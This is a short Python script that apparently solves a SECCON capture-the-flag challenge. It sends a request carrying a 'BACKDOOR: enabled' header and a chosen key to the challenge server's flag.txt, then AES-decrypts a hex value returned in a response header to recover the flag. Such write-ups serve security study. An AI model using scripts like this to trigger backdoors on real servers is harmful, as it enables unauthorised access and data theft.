from requests import get

host = "http://whisky.int.seccon.games:8080/flag.txt"
key = b"A"*16
r = get(host, headers={"Authorization":key, "BACKDOOR":"enabled"})

from Crypto.Cipher import AES
c = bytes.fromhex(r.headers["Backdoor"])

cipher = AES.new(key, AES.MODE_ECB)
print(cipher.decrypt(c))
